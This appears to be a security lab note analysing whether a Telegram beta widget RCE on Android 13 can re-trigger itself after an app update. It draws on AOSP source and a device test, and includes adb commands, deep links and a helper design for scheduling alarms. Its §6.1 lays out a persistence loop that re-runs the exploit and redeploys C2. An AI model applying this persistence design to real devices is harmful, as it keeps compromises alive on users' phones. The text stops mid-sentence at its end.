# Post-update re-trigger of the widget RCE (72799 / Android 13)

Scope: host/source plus a **device run on 2026-11-03** (Sony XQ-BT52,
Android 13, build 62.2.A.0.533, package `org.telegram.messenger.beta`,
versionCode 72799, UID 10357, widget chat `<CHAT_ID>`, widget message `79415`).
The measured result is in §0.1; the original source analysis below is kept
unchanged except where the device contradicted it. The claim under test is the
one in the task: after the first #1827/#1865 widget RCE, the exploit schedules
a local re-trigger; the app update kills the process; the trigger fires, opens
the widget chat, the widget JS runs again and redeploys the C2.

This note does not modify the main report. Lab artifacts:
`lab/post_update_retrigger/` (AOSP refs, smali excerpts, buildable helper,
device test plan).

---

## 0. Verdict (short)

1. **AlarmManager alarms and their PendingIntents do survive a package
   update** on AOSP Android 13. `AlarmManagerService` explicitly keeps them on
   `ACTION_PACKAGE_REMOVED` with `EXTRA_REPLACING=true`
   (`AlarmManagerService.java:5151-5158`), and `PendingIntentController` does
   not cancel PendingIntents on update (`PendingIntentController.java:174-190`,
   `ActivityManagerService.java:4537-4540`). **Device-proven 2026-11-03**
   (§0.1): the alarm fired after `install -r`.
2. **JobScheduler jobs survive a package update** (not force-stop, not
   uninstall): `JobSchedulerService` cancels on `ACTION_PACKAGE_FULLY_REMOVED`
   and `ACTION_PACKAGE_RESTARTED` (force-stop), or when the whole package is
   disabled (`JobSchedulerService.java:841-980`); an ordinary update does
   neither. **But a job survives a reboot only if
   `JobInfo.Builder.setPersisted(true)` was set; the default is false.**
   `JobIntentService` and `KeepAliveJob` never call `setPersisted(true)`
   (0 hits in `JobIntentService.smali`/`KeepAliveJob.smali`), so Telegram's
   own keep-alive job is **not** reboot-persisted. The device run confirms:
   the default job was present in `dumpsys jobscheduler` before reboot, absent
   after, and absent from `/data/system/job/jobs.xml`; a lab `jobp` job with
   `setPersisted(true)` *was* written to `jobs.xml` and survived the reboot.
   The task's “jobs survive both” is therefore true only for a deliberately
   persisted job, not for Telegram's `KeepAliveJob`.
3. The **hard blocker is not survival, it is background activity launch**:
   AlarmManager sends an activity PendingIntent with
   `setPendingIntentBackgroundActivityLaunchAllowed(false)`
   (`AlarmManagerService.java:1871-1876`, `:4824-4832`). On Android 13
   `ActivityStarter` then aborts the start unless the calling app has a BAL
   exemption (`ActivityStarter.java:1278-1530`). A foreground service is **not**
   an exemption (`BackgroundLaunchProcessController.java:79-140`). The only
   normal-app exemption Telegram could use is
   `SYSTEM_ALERT_WINDOW` (`ActivityStarter.java:1463-1468`,
   `ActivityTaskManagerService.java:1038-1046`).
4. Therefore the sentence “the alarm fires and the app opens the widget chat”
   is **conditional**: it works if `SYSTEM_ALERT_WINDOW` (Display over other
   apps) is granted to Telegram, and is silently aborted otherwise. Telegram
   declares the permission (`manifest_72799_full.txt:133`) but it is a special
   app access; it is not granted by default on Android 13.
5. A background process start (alarm broadcast to `AppStartReceiver`, or a
   `KeepAliveJob` job) **does not render the widget**. The widget sandbox starts
   from the chat view (`ChatMessageCell.r3` → `wv` → `hl0` → `pb` → `p.o` →
   `k0.e` → `WidgetSandboxNative.create`), not from `ApplicationLoader` or the
   chat list (`notes/update_widget_cache.md` §4.2). So a job/alarm that only
   starts the process cannot re-trigger the widget RCE by itself.
6. The exploit’s app-UID shell cannot create an alarm or job with `am`, `cmd
   alarm` or `cmd jobscheduler`: the shell commands do not expose a create path
   (`AlarmManagerService.java:5730-5765`, `JobSchedulerShellCommand.java:48-74`).
   It needs a Java PendingIntent creator. The helper in
   `lab/post_update_retrigger/helper/` (`Retrigger.java`, and the new
   `Retrigger2.java` with `user`/`jobp` modes) runs under `app_process` as the
   Telegram UID and creates alarms/jobs owned by the Telegram package. It was
   device-tested on 2026-11-03 (§0.1).
7. **With `SYSTEM_ALERT_WINDOW=allow`, an activity PendingIntent alarm does
   open the widget chat after `install -r` and re-runs the first RCE.** The
   device run used `tg://openmessage?user_id=<CHAT_ID>&message_id=79415`; the
   `chat_id` form did **not** navigate for this user chat (it only logged
   `link manager handle` and stayed on the chat list). Without overlay the
   same activity start is BAL-blocked on Android 13. After **reboot** the
   alarm is gone; a persisted `KeepAliveJob` job can only wake the process
   (and only after the user is unlocked), not open an activity; the exact
   reboot+chat path is **none**.

**Device result:** the update-path re-trigger is positive with overlay; the
reboot-path re-trigger is negative. Do not generalize the update result to a
reboot or to a non-persisted job. The measured run is §0.1 and
`lab/post_update_retrigger/device/20261103/`.

---

## 0.1 Device result — Sony XQ-BT52, 2026-11-03

**(a) Overlay and baseline.** `adb shell appops get
org.telegram.messenger.beta SYSTEM_ALERT_WINDOW` was `default` on arrival; it
was set to `allow` with `appops set ... allow` and verified `allow`. The beta
account on the phone had been logged out/its `cache4.db` was empty, so the
archived Sony account was restored with root (`cache4.db`, `tgnet.dat`,
`dc2conf.dat`, `shared_prefs/userconfing.xml`); the first RCE then ran from
message 79415 (`tools/widget_tool.py` dump: the 13,784 B `C2 START` payload,
`CFG.SYSTEM_DELTA: 0x26df0n`). The app-UID C2 session `hello` (captured **before** the update) showed
`uid=10357 user=u0_a357 device=XQ-BT52`; the post-update run was captured as
the RCE debug screenshot because the C2 server had been stopped before the
alarm fired.

DB bookkeeping (do not overwrite again without the restore script):

| snapshot | md5 | note |
|---|---|---|
| `backup_20261103_0036_original/cache4.db` | `740eac56d5524a20648c0b2f241351e2` | empty/0 dialogs, 0 messages — the beta state found at 00:36 |
| `backup_20261103_pre_overlay/cache4.db` | `0b514470073ad50c3d7f505f030cc6bf` | restored-account DB before the overlay test; widget 79415 = `<div id="t">restored</div>` |
| `known_good/known_good_rce_79415.db` | `38e7b3cbe6b00e5cdd08cc878ceeb07f` | RCE payload (C2 START, 13,784 B) — used for the test |
| `known_good/known_good_restored_79415.db` | `54e9833c392be79002b64b1ed919ffc4` | `restored` widget, known-good benign |
| live after `install -r` | `8232e6f1a21fd90e86e3fcd8022f9ce4` | post-update checkpoint; widget 79415 still the RCE payload |

The current pre-test DB was backed up to
`lab/post_update_retrigger/device/backup_20261103_pre_overlay/` with MD5/SHA-256
for `cache4.db`, `-wal`, `-shm`; `restore_db.sh` exists for a one-command
restore. The RCE snapshot is in `device/known_good/`; no further DB replacement
was made after the test.

**(b) Update control.** `adb install -r /tmp/opencode/base72799.apk` at
`00:54:35`; the app process was killed at `00:54:38`:

```
I/ActivityManager: Force stopping org.telegram.messenger.beta appid=10357
  user=-1: installPackageLI
I/ActivityManager: Killing 2835:org.telegram.messenger.beta/u0a357 (adj 0):
  stop org.telegram.messenger.beta due to installPackageLI
```

The new code path was
`/data/app/~~G0ZPZt9-Y6tmpocq6kxeNA==/...` (versionCode 72799); the pre-update
path was `~~r1vDzV8...`. DB md5 after the update was
`8232e6f1a21fd90e86e3fcd8022f9ce4`; message 79415 still decoded to the 13,784 B
RCE HTML.

**(c) Alarm + overlay after update — POSITIVE.** A UID-10357 activity
PendingIntent alarm was scheduled (helper `user 120`), target
`org.telegram.ui.LaunchActivity`, deep link
`tg://openmessage?user_id=<CHAT_ID>&message_id=79415`; alarm at
`00:55:45`, window ±90 s. It fired at `00:56:02`:

```
I/ActivityTaskManager: START u0 {act=android.intent.action.VIEW
  dat=tg://openmessage/... cmp=org.telegram.messenger.beta/org.telegram.ui.LaunchActivity}
  from uid 10357
W/ActivityTaskManager: Background activity start for
  org.telegram.messenger.beta allowed because SYSTEM_ALERT_WINDOW permission is granted.
D/tmessages: link manager handle tg://openmessage?user_id=<CHAT_ID>&message_id=79415
D/tmessages: load messages in chat <CHAT_ID> ... max_id 79415 ...
D/tmessages: present fragment un args=Bundle[{message_id=79415, user_id=<CHAT_ID>}]
D/tmessages: widget payload: zlib, 4663 -> 13784 bytes
```

The widget rendered and the existing #1827/#1865 payload ran (screen debug
`DBG ... HOOKED | AFTER`; screenshot
`device/20261103/screenshot_after_update_alarm.png`). This is a **real
update-surviving re-trigger of the first ACE**, with `SYSTEM_ALERT_WINDOW`
granted; no new parser ACE and no daemon survival are claimed.

The `chat_id=<CHAT_ID>&message_id=79415` form did **not** navigate (it stayed on
the chat list; only `link manager handle` was logged). The working form is
`user_id=...` for this user dialog. The helper's original `activity` mode uses
`chat_id`; the new `user` mode is required for chat <CHAT_ID>.

**(d) Reboot control — alarm lost, job only wakes process.** Before `adb
reboot` at `00:57:35`, `dumpsys alarm` showed the next telegram alarm at
`01:01:29`; after boot (`01:03:28`) `dumpsys alarm` had **no**
`org.telegram.messenger.beta` alarm and `/data/system/alarm*` had no entry.
The alarm did not survive the reboot, as expected.

The **default** helper job (`JobInfo.Builder` without `setPersisted`) was in
`dumpsys jobscheduler` before the reboot but absent after; it was never in
`/data/system/job/jobs.xml`. The reason is the `JobInfo` default
`isPersisted=false`; `JobIntentService` and `KeepAliveJob` do not call
`setPersisted(true)`. A lab **persisted** job (`Retrigger2 jobp`, explicit
`b.setPersisted(true)`) *was* written to `jobs.xml` and survived the reboot
(`dumpsys jobscheduler` shows `PERSISTED` after boot). Even so, `KeepAliveJob`
only waits on its latch; `cmd jobscheduler run -f org.telegram.messenger.beta
1000` reported `Running job [FORCED]` but no app process started while the
device was locked (`pidof` empty; top `com.android.settings/.FallbackHome`).
`BringAppForegroundService` is an `IntentService`, not a `JobService`, so it
cannot be the target of a JobScheduler job. There is therefore **no
job→LaunchActivity→widget-chat path after reboot**.

**Verdict for the exact question:** alarm + overlay = **update only, positive**
(opens 79415 and re-runs the first RCE); job = **survives update in memory;
survives reboot only if persisted; wakes the process, cannot open the chat**;
home-screen widget = process/RemoteViews only; **reboot+update chat path:
none**.

Evidence: `lab/post_update_retrigger/device/20261103/` (logcat excerpt,
screenshots, alarm/job dumps, `jobs.xml` before/after, C2 pre-update session),
`device/known_good/`, `device/restore_db.sh`, and
`device/backup_20261103_*/`.

---

## 1. What “re-trigger the widget RCE” actually requires

The #1827/#1865 payload is a bot-widget message in `messages_v2`. It is dormant
after an update: the row is still in `cache4.db`, but the JS engine is only
started when the chat view binds the widget bubble.

The chain in 72799:

```
ChatMessageCell.r3(MessageObject ...)          // org/telegram/ui/Cells/q1.smali:182215
  if (messageObject.D == 0x24)                 // widget media, q1.smali:205388
    new wv(...)                                // q1.smali:205513
      wv.<init> -> J() -> j()                  // wv.smali:294, :5612, :13526
        pageBlockEmbed url "tg-widget:..."     // wv.smali:17791, :17962
          new hl0(...)                         // hl0.smali:180
            p.i(url), p.k(url, ...)            // hl0.smali:180, :220
            post pb                            // hl0.smali:289-298
              pb.run -> p.o()                  // pb.smali:172
                p.y(m) -> k0.e()               // p.smali:4794, :4899, :5143
                  WidgetSandboxNative.create   // k0.smali:1263
```

So the two code paths found for an automatic post-update widget execution are:

* **open the chat view** at the widget message (the normal trigger), or
* find an in-process path that builds `wv` for a live `MessageObject`
  (`MessageObject.n0()` after a text/user update; `notes/update_widget_cache.md`
  §4.4). That path is not reached by a cold start / dialog-list load in the
  code traced there, and is not used by this design.

This note therefore treats “re-trigger” as “open the widget chat at message
79415”, and only discusses how to do that after the update, locally and without
root.

---

## 2. Components and intents (72799)

Manifest facts are from `aapt2 dump xmltree` of the 72799 debug rebuild
(`telegram_beta_72799_dbg2.apk`, package `org.telegram.messenger.beta.dbg`);
the full dump is `lab/post_update_retrigger/manifest_72799_full.txt` (line
numbers below are dump lines; the original manifest line is in parentheses).
The debug rebuild renames package-specific authorities and the package suffix,
but the component names, actions, filters and `exported` flags are the same as
the Sony `org.telegram.messenger.beta` build; use the Sony package in commands.

### 2.1 `LaunchActivity` — exported, `singleTask`, `tg` scheme

`manifest_72799_full.txt:309-317` (manifest line 139):

```xml
<activity android:name="org.telegram.ui.LaunchActivity"
          android:exported="true"
          android:launchMode="2"            <!-- singleTask -->
          ...>
```

The `tg` filter is `ACTION_VIEW` + `DEFAULT` + `BROWSABLE` + `scheme="tg"`
(`manifest_72799_full.txt:410-416`, manifest lines 195-205). There is no host or
path restriction; any `tg://...` matches.

The `tg://openmessage` parser is in `LaunchActivity.W(...)`:
`smali_classes3/org/telegram/ui/LaunchActivity.smali:27514-27610`:

* it strips `tg:openmessage` / `tg://openmessage`;
* reads `user_id`, `chat_id`, `message_id` (`p3` is set to the `"message_id"`
  string before the parse at `:22163`), `account_user_id`;
* parses `chat_id` as long, `message_id` as int;
* builds a chat bundle and opens the chat at the message.

Exact deep link for the test:

```
tg://openmessage?chat_id=<CHAT_ID>&message_id=79415
```

If the dialog is a user rather than a chat, the parser also accepts
`user_id=<CHAT_ID>`; `chat_id` is what `OpenChatReceiver` and the existing T8
test use.

### 2.2 `OpenChatReceiver` — exported activity, no intent filter

`manifest_72799_full.txt:643-646` (manifest line 304): exported `Activity`,
no filter. `OpenChatReceiver.smali` accepts `action.startsWith("com.tmessages.openchat")`
and reads `chatId` (long), `userId` (long), `encId` (int), then forwards to
`LaunchActivity` with the same action/extras and `finish()`.

External trigger:

```sh
adb shell am start -n org.telegram.messenger.beta/org.telegram.messenger.OpenChatReceiver \
  -a com.tmessages.openchat --el chatId <CHAT_ID>
```

This is a real trigger, but it is an **activity start**: from the app UID in the
background it is BAL-blocked unless the app has an exemption; from `adb`/shell
it works because UID 2000 is privileged. It is not automatic.

### 2.3 `AppStartReceiver` — boot only, no UI

`manifest_72799_full.txt:814-822` (manifest lines 383-386): exported=false,
actions `org.telegram.start` and `android.intent.action.BOOT_COMPLETED`.
`AppStartReceiver.onReceive` only acts on `BOOT_COMPLETED`
(`AppStartReceiver.smali`), posting `ag/f3(9)` → `w0.x()` (push service
startup). It does not open a chat and does not render the widget. `org.telegram.start`
is ignored by this receiver (the action comparison is `BOOT_COMPLETED.equals(action)`).

### 2.4 `BringAppForegroundService` — the false lead

`manifest_72799_full.txt:731-735` (manifest line 348): exported `IntentService`
(the manifest carries `foregroundServiceType=0x2`, but the class itself does not
call `startForeground`). Its `onHandleIntent` ignores the incoming intent and
does:

```java
Intent i = new Intent(this, LaunchActivity.class);
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
i.setAction(Intent.ACTION_MAIN);
startActivity(i);
```

(`BringAppForegroundService.smali:onHandleIntent`). It opens `LaunchActivity`
with **MAIN**, not with the widget deep link, and its `startActivity` is subject
to the same BAL check. It can be used as a BAL probe, not as a chat trigger.
If the app's task were still in Recents it might resume the last chat, but the
72799 update log shows the task is removed (`wm_task_removed`), so it lands on
the chat list (`folderId = 0`).

### 2.5 `KeepAliveJob` — a real `JobService`/`JobIntentService`

`manifest_72799_full.txt:726-729` (manifest line 347): service
`org.telegram.messenger.KeepAliveJob`, permission `BIND_JOB_SERVICE`,
exported=false. The class extends
`org.telegram.messenger.support.JobIntentService` (a `JobService` engine on
API 26+). `ag/f3` case `pswitch_b` calls `JobIntentService.enqueueWork(context,
KeepAliveJob.class, 1000, new Intent())` (`ag/f3.smali:805-850`, enqueue at `:846`). The work
handler only keeps the process alive (`KeepAliveJob.smali:180-260`), it does
not open UI. This is the job used by the helper’s `job` mode to test survival.

### 2.6 Existing Telegram alarms

Telegram itself uses `AlarmManager` in `pt` (notifications) and in the
Google datatransport library:

* `pt.R()` creates `PendingIntent.getService(..., NotificationRepeat.class, ...)`
  with `currentAccount`, and calls `AlarmManager.set(2, elapsedRealtime + minutes,
  pendingIntent)` (`pt.smali:12148-12275`). Type 2 is
  `ELAPSED_REALTIME_WAKEUP`; `set()` is inexact and does not need
  `SCHEDULE_EXACT_ALARM`.
* `pt` content intents for notifications are `PendingIntent.getActivity` to
  `LaunchActivity` with a chat bundle (`pt.smali:2510-2525`, `:18568`,
  `:23455`). These are only sent when the user taps the notification.
* `com.google.android.datatransport...AlarmManagerSchedulerBroadcastReceiver`
  is another app alarm, unrelated to widgets.

The existence of `pt.R()` is useful evidence that Telegram relies on
update-surviving inexact alarms for background work, but it does **not** open a
chat: `NotificationRepeat` re-posts notifications, and message notifications
have no `fullScreenIntent` (only Telegram's call/VoIP notification builders call
`Notification.Builder.setFullScreenIntent` (`VoIPService.smali:27698`,
`VoIPPreNotificationService.smali:2694`, `VoIPGroupNotification.smali:2300`, and
`cc/f.smali:444`), and they target call UI, not the widget chat).

### 2.7 `MY_PACKAGE_REPLACED` is absent

`grep -c MY_PACKAGE_REPLACED manifest_72799_full.txt` is **0**. The 72799
manifest has no receiver for `android.intent.action.MY_PACKAGE_REPLACED`. Since
the APK is signed and the app cannot add a manifest component at runtime, the
exploit cannot use a package-replaced receiver without modifying the APK (which
is not the no-root premise). A dynamic receiver would die with the process that
the update kills.

---

## 3. Do alarms, PendingIntents and jobs survive the update?

### 3.1 AlarmManager: yes on update; no on force-stop/uninstall

`AlarmManagerService` registers an `UninstallReceiver` for
`ACTION_PACKAGE_REMOVED`, `ACTION_PACKAGE_ADDED`, `ACTION_PACKAGE_RESTARTED`
(`AlarmManagerService.java:5088-5098`). The relevant branches:

```java
// AlarmManagerService.java:5151-5158
case Intent.ACTION_PACKAGE_REMOVED:
    if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) {
        // This package is being updated; don't kill its alarms.
        // We will refresh the exact alarm candidates on subsequent receipt of
        // PACKAGE_ADDED.
        return;
    }
```

`PACKAGE_ADDED` with replacing=true only schedules
`CHECK_EXACT_ALARM_PERMISSION_ON_UPDATE` (`:5137-5146`) — relevant only to
**exact** alarms, and only if the app loses `SCHEDULE_EXACT_ALARM` on update.
The helper uses an inexact alarm (`windowLength = -1`), so this re-check does
not remove it.

`ACTION_PACKAGE_RESTARTED` (force-stop) falls through to
`removeLocked(uid, ...)` (`:5160-5182`). Uninstall (`replacing=false`) also
removes alarms.

**Conclusion:** update → keep; force-stop → remove; uninstall → remove.

### 3.2 PendingIntent: not cancelled on update

`PendingIntentController.removePendingIntentsForPackage()` has the explicit
comment that records are only removed on force-stop/user stop, not for package
updates, because app widgets and other consumers may still hold them
(`PendingIntentController.java:174-190`). The only call from
`ActivityManagerService` is:

```java
// ActivityManagerService.java:4537-4540
if (packageName == null || uninstalling) {
    didSomething |= mPendingIntentController.removePendingIntentsForPackage(
            packageName, userId, appId, doit);
}
```

On update `uninstalling=false` (`fullUninstall = removed && !replacing`,
`ActivityManagerService.java:13824`), so the record is not cancelled. The
alarm’s `PendingIntent` still resolves to `LaunchActivity` / `AppStartReceiver`
in the new APK.

### 3.3 JobScheduler: yes on update; no on force-stop/uninstall

`JobSchedulerService`’s package receiver (`JobSchedulerService.java:831-980`):

* `ACTION_PACKAGE_CHANGED`: only cancels if the **whole package** is disabled
  (`component.equals(pkgName)` + disabled state); otherwise just re-evaluates
  controllers (`:841-901`).
* `ACTION_PACKAGE_ADDED` with replacing=true: clears a cache only
  (`:903-909`).
* `ACTION_PACKAGE_FULLY_REMOVED`: cancels jobs (`:910-930`).
* `ACTION_PACKAGE_RESTARTED`: cancels jobs with “app force stopped” (`:967-980`).

There is no `ACTION_PACKAGE_REMOVED` handling. Only jobs with
`JobInfo.Builder.setPersisted(true)` are stored in
`/data/system/job/jobs.xml` (`JobStore.java:150`); the default is false.
Telegram's `JobIntentService`/`KeepAliveJob` never sets it, so the app's own
keep-alive job is memory-only. An update does not clear app data.
**Conclusion:** update → keep; force-stop → cancel; uninstall → cancel;
reboot → keep only a persisted job.

### 3.4 What actually kills the app process

For `ACTION_PACKAGE_REMOVED` with replacing=true,
`ActivityManagerService` calls
`forceStopPackageLocked(..., fullUninstall=false, ...)`
(`ActivityManagerService.java:13829-13836`). `ProcessList.killPackageProcessesLSP()`
iterates the zygote-started processes known to AMS
(`ProcessList.java:2702-2795`); `ProcessRecord.killLocked()` calls
`Process.killProcessQuiet(pid)` and `ProcessList.killProcessGroup(uid, pid)`
(`ProcessRecord.java:1083-1088`). The UID cgroup kill is why the detached C2
supervisor (`setsid`) also dies on a force-stop/update: the app process is
killed and the UID cgroup is torn down. This does **not** touch the alarm or
job state in system_server.

### 3.5 Summary table

| Event | App process | Alarms | PendingIntents | Jobs | Widget payload |
|---|---|---|---|---|---|
| `adb install -r` / Play update (same package, same key) | killed (`installPackageLI`) | **kept** | **kept** | **kept** | `cache4.db` row kept |
| `am force-stop` | killed + UID cgroup | **removed** (`PACKAGE_RESTARTED`) | not necessarily cancelled, but useless | **cancelled** | row kept, dormant |
| uninstall / clear data | killed, data cleared | removed | cancelled | cancelled | gone |
| reboot | killed | **not persisted** (no reboot re-arm) | PI records gone with system_server | only `setPersisted(true)` jobs; Telegram `KeepAliveJob` is **not** persisted | row kept |
| update + reboot | killed | gone (reboot) | gone | only a persisted job (lab `jobp`); app's `KeepAliveJob` not | row kept |

The last row matters: an alarm is **not** reboot-persistent. A design that must
survive both an update and a reboot needs a component that runs at boot and
re-arms it. `AppStartReceiver` is the only boot receiver in 72799, and its code
only starts push (`w0.x()`); it does not re-create an alarm. Without a boot-time
code-execution stage (the forged ART app image is the project's candidate), a
scheduled alarm cannot be re-created after a reboot. A persisted JobScheduler job can run after reboot, but it still does not
render the widget chat (see §1); Telegram's own `KeepAliveJob` is not even
persisted.

---

## 4. The real blocker: Android 13 background activity launch

### 4.1 AlarmManager deliberately restricts its PendingIntents

`AlarmManagerService.onStart()` (`:1871-1876`) sets
`setPendingIntentBackgroundActivityLaunchAllowed(false)` on every options bundle
it uses, including `mActivityOptsRestrictBal` and `mBroadcastOptsRestrictBal`.
`getAlarmOperationBundle()` returns those restricted bundles for activity and
broadcast alarms (`:4824-4832`).

`ComponentOptions` defines the key with a **true** default
(`ComponentOptions.java:30-60`), but AlarmManager writes **false** explicitly.
`PendingIntentRecord.sendInner()` computes:

```java
// PendingIntentRecord.java:459-463
final boolean allowTrampoline = uid != callingUid
        && controller.mAtmInternal.isUidForeground(callingUid)
        && isPendingIntentBalAllowedByCaller(options);
```

With `KEY_PENDING_INTENT_BACKGROUND_ACTIVITY_ALLOWED=false`,
`allowTrampoline` is false even though system_server (the alarm sender) is
foreground and the app is not.

### 4.2 ActivityStarter aborts the start

For a PendingIntent activity start, `ActivityStartController` passes the
PendingIntent creator’s UID as `callingUid` and system_server as
`realCallingUid` (`ActivityStartController.java:256-284`); `ActivityStarter`
then evaluates `shouldAbortBackgroundActivityStart()`
(`ActivityStarter.java:1278-1530`):

* `callingUid` is Telegram, which has no visible window, is not TOP/BOUND_TOP,
  is not persistent/system<HOME>/recents/device-owner/companion;
* `balAllowedByPiSender` is false, so the real caller’s (system) foreground
  state is not used;
* `callerApp` is null for a PendingIntent start, so no process token applies;
* `START_ACTIVITIES_FROM_BACKGROUND` is not held by Telegram;
* the only remaining normal-app check is `SYSTEM_ALERT_WINDOW`
  (`ActivityStarter.java:1463-1468`).

A **foreground service does not help**: `BackgroundLaunchProcessController`
checks activity-in-foreground-task, bound-by-foreground-uid, instrumentation,
and explicit BAL tokens; it has no foreground-service check
(`BackgroundLaunchProcessController.java:79-140`). This is the same result as
the Android 10+ documentation: a foreground service is not a background
activity launch exemption.

`hasSystemAlertWindowPermission()` is the app-op
`OP_SYSTEM_ALERT_WINDOW` check (`ActivityTaskManagerService.java:1038-1046`).
Telegram declares the permission (`manifest_72799_full.txt:133`), but on
Android 13 it is a special app access; `Settings.canDrawOverlays()` is false
unless the user grants “Display over other apps”. The app-op’s default mode is
`MODE_DEFAULT`, which falls back to a permission check; the permission’s
protection level is `signature|setup|appop|installer|pre23|development`
(AOSP `core/res/AndroidManifest.xml:3166-3169`), so a normal targetSdk-36
install is denied. One caveat for the lab: the Sony 72799 build is a
**debuggable** build; a debug build installed with `pm install -g` (or an
explicit `pm grant`) can have the development-flagged permission granted. Check
`adb shell appops get org.telegram.messenger.beta SYSTEM_ALERT_WINDOW` **before**
the test; if it is already `allow`, T3 can pass without a user toggle, and if it
is `default`/`deny`, T2 is the expected control.

### 4.3 Consequence for the design

| Attempt | Result without overlay | Result with `SYSTEM_ALERT_WINDOW=allow` |
|---|---|---|
| alarm → `PendingIntent.getActivity(LaunchActivity, tg://openmessage...)` | **aborted** (`Background activity start [...]`) | **starts**; chat opens at message; widget runs |
| alarm → `PendingIntent.getActivity(OpenChatReceiver, com.tmessages.openchat)` | aborted (same BAL) | starts; receiver forwards to LaunchActivity |
| alarm → `PendingIntent.getBroadcast(AppStartReceiver, BOOT_COMPLETED)` | delivered; process starts; **no UI** | same |
| alarm → `PendingIntent.getService(BringAppForegroundService)` | service may start, its `startActivity(MAIN)` aborted; no chat | service starts; LaunchActivity MAIN, **chat list**, not the widget chat |
| alarm → `PendingIntent.getService(NotificationRepeat)` | service start may be denied by background-service limits; no UI | same |
| JobScheduler job → `KeepAliveJob` | job runs; process kept alive; **no UI** | same |
| notification with `fullScreenIntent` | only if app code posts one; message notifications do not; VoIP FSI targets VoIP UI | same |
| `adb`/shell `am start` | works (UID 2000 is privileged) | works |

**This is the critical negative result:** an alarm that fires after the update
can start the process, but it cannot open the widget chat on a stock Android 13
device unless Telegram has the overlay special access.

---

## 5. Scheduling from the app-UID exploit

### 5.1 Why the shell cannot do it directly

`am`/`cmd` are the only general-purpose tools an app-UID shell has, and neither
can create an alarm or a job:

* `AlarmManagerService.ShellCmd` only handles `set-time`, `set-timezone`,
  `get-config-version` (`AlarmManagerService.java:5730-5765`). There is no
  `cmd alarm set`.
* `JobSchedulerShellCommand` handles `run`, `timeout`, `cancel`,
  `get-job-state`, quotas, etc., but no `schedule`/create
  (`JobSchedulerShellCommand.java:48-74`, help at `:436-490`).
* `cmd notification post` can create a notification with a content intent, but
  `NotificationShellCmd.checkShellCommandPermission()` only accepts root or
  shell UID (`NotificationShellCmd.java:128-130`, `:157-162`), so an app UID
  cannot use it.
* `service call alarm` cannot carry a `PendingIntent` binder from a shell.

### 5.2 The helper

`lab/post_update_retrigger/helper/Retrigger.java` is a small DEX run by
`app_process` as the Telegram UID. It uses reflection to reach:

* `ActivityManager.getService()` → `IActivityManager.getIntentSenderWithFeature`
  with `packageName = org.telegram.messenger.beta`; `ActivityManagerService`
  checks that the caller UID matches that package
  (`ActivityManagerService.java:5349-5360`);
* `new PendingIntent(IIntentSender)` (`PendingIntent.java:1443-1445`);
* `ServiceManager.getService("alarm")` → `IAlarmManager.set(...)`
  (`IAlarmManager.aidl`);
* `ServiceManager.getService("jobscheduler")` → `IJobScheduler.schedule(JobInfo)`
  (`IJobScheduler.aidl`).

Modes (see `helper/README.md`):

* `activity` — `LaunchActivity` + `tg://openmessage?chat_id=<CHAT_ID>&message_id=79415`;
* `broadcast` — `AppStartReceiver` + `BOOT_COMPLETED` (process start only);
* `service` — `NotificationRepeat` (best-effort process start);
* `job` — `JobInfo` id 1000 to `KeepAliveJob` (job survival test);
* `all`.

The alarm is inexact (`windowLength = -1`, `RTC_WAKEUP`), so no exact-alarm
permission is needed and the update’s exact-alarm re-check does not remove it.
The PendingIntents are owned by the **Telegram** package, so the survival
semantics above apply to the Telegram update. A companion app’s PendingIntent
would be owned by the companion (its alarms are also unaffected by a Telegram
update), but the BAL check would use the **companion’s** UID/app-op and the
companion would have to stay installed; that is an external-helper design, not
the first exploit’s self-trigger.

### 5.3 What is not proven

* `app_process` execution from the Telegram UID on the Sony (SELinux may deny
  `execute`; the C2 shell is an app-UID process, so this is testable).
* The reflection signatures on this exact ROM (the AOSP signatures are
  Android 13; the Sony is Android 13 but OEM-patched).
* `IAlarmManager.set` acceptance of `windowLength=-1` and the package/UID check
  from a non-zygote app_process.
* The helper is a test instrument; it is not part of the current C2 payload.

If `app_process` is denied, the remaining implementation option is an in-process
JNI bridge from the native RCE (the app process already has a `JNIEnv`); that
is more work than this note and is not claimed here.

---

## 6. Design options after the update

### 6.1 A — overlay-granted alarm → deep link (the only self-contained auto-open found)

Preconditions:

1. Telegram has `SYSTEM_ALERT_WINDOW=allow` (user-granted special access);
2. the exploit can create an alarm with a Telegram-owned activity PendingIntent
   (helper/app_process or JNI);
3. the alarm time is after the update (e.g. +300 s; update immediately);
4. the widget message is still in `cache4.db` and the chat opens at 79415.

Sequence:

```
widget RCE (foreground chat)
  -> shell writes/runs retrigger.dex via app_process
  -> AlarmManager.set(RTC_WAKEUP, now + 300 s, PendingIntent.getActivity(
        LaunchActivity, "tg://openmessage?chat_id=<CHAT_ID>&message_id=79415"))
  -> update kills the app (installPackageLI); alarm + PI survive
  -> alarm fires; AlarmManager sends the PI with BAL=false
  -> ActivityStarter sees SYSTEM_ALERT_WINDOW=allow -> allowed
  -> LaunchActivity opens the chat at 79415
  -> ChatMessageCell.r3 -> wv -> hl0 -> widget sandbox -> #1827/#1865 RCE
  -> payload re-deploys C2 and re-arms the next alarm
```

This is the design the task describes, with the added **overlay** precondition.
It is not proven on the Sony until T3.

### 6.2 B — broadcast alarm + process start (no UI)

Use `AppStartReceiver` + `BOOT_COMPLETED` (or `KeepAliveJob`) to start the app
process after the update. This survives without overlay and is useful for a
**startup-stage** payload (e.g. a fixed ART app image or a native startup hook),
but it does **not** render the widget. Do not present it as a widget re-trigger.

`AppStartReceiver` starts `w0.x()` (push service), and `NotificationsService`
starts the process; `ApplicationLoaderImpl.onCreate` runs `w0.w()` → `ks.g`
(native load) before any UI. That is the correct place for a startup-stage
persistence, not for the widget sandbox.

### 6.3 C — user-assisted / external trigger (reliable, not autonomous)

* A notification for the widget chat (new message, or a re-posted notification)
  opens the chat when the user taps it; message notifications use
  `PendingIntent.getActivity` with a chat bundle (`pt.smali:2510-2525`).
* `OpenChatReceiver` from `adb` or a foreground companion app works; from the
  app UID in the background it is BAL-blocked.
* A home-screen Telegram widget uses a `PendingIntent` template
  (`ChatsWidgetProvider.smali:520-580`); the launcher is a foreground sender,
  so a **tap** works, but nothing auto-sends it after an update.
* A companion app with `SYSTEM_ALERT_WINDOW` can schedule the alarm even if
  Telegram does not have overlay; this is local and no-root but is an extra
  install, not the first exploit’s self-trigger.

### 6.4 D — startup code execution (the existing alternative)

The forged ART app image `cache/oat_primary/arm64/base.art` is app-writable and
loaded at every process start, including the `AppStartReceiver` boot start
